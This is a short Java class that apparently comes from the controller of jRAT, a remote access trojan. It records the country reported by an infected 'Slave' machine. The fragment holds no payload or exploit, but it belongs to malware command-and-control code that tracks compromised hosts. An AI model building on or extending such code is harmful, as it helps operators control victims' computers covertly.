package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.settings.Settings;

public class Packet8InitCountry extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String country = slave.readLine();

		if (!Settings.getGlobal().getBoolean(Settings.KEY_USE_COUNTRY_DB)) {
			slave.setCountry(country);	
		}

	}

}
